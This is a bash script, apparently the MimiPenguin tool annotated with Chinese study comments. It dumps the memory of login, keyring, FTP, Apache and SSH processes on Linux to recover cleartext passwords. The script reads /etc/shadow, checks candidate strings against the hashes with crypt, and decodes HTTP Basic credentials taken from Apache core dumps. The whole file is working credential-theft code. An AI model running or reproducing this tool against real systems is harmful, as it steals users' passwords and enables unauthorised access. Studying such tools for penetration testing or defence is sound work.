#!/bin/bash

# Author: Hunter Gregal
# Github: /huntergregal Twitter: /huntergregal Site: huntergregal.com
# Dumps cleartext credentials from memory

#脚本针对不同的linux系统有不同的提取密码策略，因此如果对其他系统的
#密码管理方式了解的话，可以在此基础上添加功能

#root check
if [[ "$EUID" -ne 0 ]]; then        #root的euid为0,可在/etc/passwd中查看
	echo "Root required - You are dumping memory..."
	echo "Even mimikatz requires administrator"
	exit 1
fi
#读取/etc/shadow，读取进程id，dump内存数据，创建文件夹等需要root权限

#/etc/passwd中字段存放格式 LOGNAME:PASSWORD:UID:GID:USERINFO:HOME:SHELL 

#Store results to cleanup later
export RESULTS=""

dump_pid ()
{
	system=$3
	pid=$1
	output_file=$2
	if [[ $system == "kali" ]]; then
		mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/$pid/maps | egrep 'heap|stack' | cut -d' ' -f 1)
	else
		mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/$pid/maps | cut -d' ' -f 1)
	fi
	while read -r memrange; do
		memrange_start=`echo $memrange | cut -d"-" -f 1`;
		memrange_start=`printf "%u\n" 0x$memrange_start`;
		memrange_stop=`echo $memrange | cut -d"-" -f 2`;
		memrange_stop=`printf "%u\n" 0x$memrange_stop`;
		memrange_size=$(($memrange_stop - $memrange_start));
		dd if=/proc/$pid/mem of=${output_file}.${pid} ibs=1 oflag=append conv=notrunc \
			skip=$memrange_start count=$memrange_size > /dev/null 2>&1
# convert and copy a file
	done <<< "$mem_maps"
}

parse_pass ()
{
#$1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE

#If hash not in dump get shadow hashes
if [[ ! "$2" ]]; then
		SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | egrep '^\$.\$')"
fi

#Determine password potential for each word
while read -r line; do
	echo "line:$line"
	#If hash in dump, prepare crypt line
    #如果在内存数据中获得了密码的hash值，就直接用这个值否则用从/etc/password中获取的值
	if [[ "$2" ]]; then
		#get ctype
		CTYPE="$(echo "$2" | cut -c-3)"
		#Escape quotes, backslashes, single quotes to pass into crypt
		SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
        #crypt包括可能的明文密码与确定的salt值
		CRYPT="\"$SAFE\", \"$CTYPE$3\""
		echo "crypt:$CRYPT"
		echo "hash:$2"
		if [[ $(python -c "import crypt; print crypt.crypt($CRYPT)") == "$2" ]]; then   #hash后比较
			#Find which user's password it is (useful if used more than once!)
			USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
			export RESULTS="$RESULTS$4			$USER:$line \n"
		fi
	#Else use shadow hashes
	elif [[ $SHADOWHASHES ]]; then
		while read -r thishash; do      #不确定用户名所以需要通过循环比较确定
			CTYPE="$(echo "$thishash" | cut -c-3)"
			SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
			#Escape quotes, backslashes, single quotes to pass into crypt
			SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
			CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
			if [[ $(python -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
				#Find which user's password it is (useful if used more than once!)
				USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
				export RESULTS="$RESULTS$4			$USER:$line\n"
			fi
		done <<< "$SHADOWHASHES"
	#if no hash data - revert to checking probability
	else
		if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ ^LOGNAME= ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ UTF-8 ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ ^splayManager[0-9]$ ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ ^gkr_system_authtok$ ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ Manager\.Worker ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ /usr/share ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ /bin ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ \.so\.[0-1]$ ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ x86_64 ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ (aoao) ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		elif [[ $line =~ stuv ]]; then
			export RESULTS="$RESULTS[LOW]$4			$line\n"
		else
			export RESULTS="$RESULTS[HIGH]$4			$line\n"
		fi
	fi
done <<< "$1"
}

#Support Kali
if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
	SOURCE="[SYSTEM - GNOME]"
	#get gdm-session-worker [pam/gdm-password] process
	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
    #GDM是一种GNOME显示环境的管理器, 它是一个运行在后台的小程序（脚本）
    #gdm-session-worker是kali一个与会话/密码有关的进程
    #sed搜索找出行,awk显示
	#if exists aka someone logged into gnome then extract...
	echo "pid:$PID"
	if [[ $PID ]];then
		while read -r pid; do
            #dump_pid通过查看进程的虚拟空间使用情况获取内存信息，把从内存中捕获到的数据保存到临时文件/tmp/dump.${pid}
			dump_pid "$pid" /tmp/dump "kali"
            #从文件中根据密码hash固定的格式^\$.\$.+$找到hash
			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
            #从hash中提取出salt
			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
            #明文密码也在内存数据中有存储，通过与_pammodutil_getpwnam_root_1和gkr_system_authtok数据的关系取出其前后共20个的字符串
			#为什么是_pammodutil_getpwnam_root_1和gkr_system_authtok，仍需继续研究
            DUMP="$(strings "/tmp/dump.${pid}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
			DUMP="${DUMP}$(strings "/tmp/dump.${pid}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
			#Remove dupes to speed up processing
            #增加换行符分割便于之后的读取
			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
           echo "HASH:$HASH" "SALT:$SALT" "DUMP:$DUMP"
			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
	
			#cleanup
			#rm -rf "/tmp/dump.${pid}"  #保留方便查看具体的文件内容
		done <<< "$PID"
	fi
fi

#Support Ubuntu
if [[ $(uname -a | awk '{print tolower($0)}') == *"ubuntu"* ]]; then
		SOURCE="[SYSTEM - GNOME]"
		#get /usr/bin/gnome-keyring-daemon process
		PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	#if exists aka someone logged into gnome then extract...
	if [[ $PID ]];then
		while read -r pid; do
			dump_pid "$pid" /tmp/dump
			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
			DUMP=$(strings "/tmp/dump.${pid}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
			DUMP+=$(strings "/tmp/dump.${pid}" | egrep -A 5 -B 5 'libgcrypt\.so\..+$')
			#Remove dupes to speed up processing
			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
			#cleanup
			rm -rf "/tmp/dump.${pid}"
		done <<< "$PID"
	fi
fi

#Support VSFTPd - Active Users
if [[ -e "/etc/vsftpd.conf" ]]; then
		SOURCE="[SYSTEM - VSFTPD]"
		#get nobody /usr/sbin/vsftpd /etc/vsftpd.conf
		PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk 'BEGIN {FS = " " } ; { print $1 }')"
	#if exists aka someone logged into FTP then extract...
	if [[ $PID ]];then
		while read -r pid; do
			dump_pid "$pid" /tmp/vsftpd
			HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+$')"
			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
			DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
			#Remove dupes to speed up processing
			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
		done <<< "$PID"

		#cleanup
		rm -rf /tmp/vsftpd*
	fi
fi

#Support Apache2 - HTTP BASIC AUTH
if [[ -e "/etc/apache2/apache2.conf" ]]; then
		SOURCE="[HTTP BASIC - APACHE2]"
		#get all apache workers /usr/sbin/apache2 -k start
		PID="$(ps -eo pid,user,command | grep apache2 | grep -v 'grep' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	#if exists aka apache2 running
	if [[ "$PID" ]];then
		#Dump all workers
		while read -r pid; do
			gcore -o /tmp/apache $pid > /dev/null 2>&1
			#without gcore - VERY SLOW!
			#dump_pid $pid /tmp/apache
		done <<< "$PID"
		#Get encoded creds
		DUMP="$(strings /tmp/apache* | egrep '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
		#for each extracted b64 - decode the cleartext
		while read -r encoded; do
			CREDS="$(echo "$encoded" | base64 -d)"
			if [[ "$CREDS" ]]; then
				export RESULTS="$RESULTS$SOURCE			$CREDS\n"
			fi
		done <<< "$DUMP"
		#cleanup
		rm -rf /tmp/apache*
	fi
fi

#Support sshd - Search active connections for Sudo passwords
if [[ -e "/etc/ssh/sshd_config" ]]; then
	SOURCE="[SYSTEM - SSH]"
	#get all ssh tty/pts sessions - sshd: user@pts01
	PID="$(ps -eo pid,command | egrep 'sshd:.+@' | grep -v 'grep' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	#if exists aka someone logged into SSH then dump
	if [[ "$PID" ]];then
		while read -r pid; do
			dump_pid "$pid" /tmp/sshd
			HASH="$(strings "/tmp/sshd.${pid}" | egrep -m 1 '^\$.\$.+$')"
			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
			DUMP=$(strings "/tmp/sshd.${pid}" | egrep -A 3 '^sudo.+')
			#Remove dupes to speed up processing
			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
		done <<< "$PID"
		#cleanup
		rm -rf /tmp/sshd.*
	fi
fi
#Output results to STDOUT
printf "MimiPenguin Results:\n"
printf "%b" "$RESULTS" | sort -u
unset RESULTS
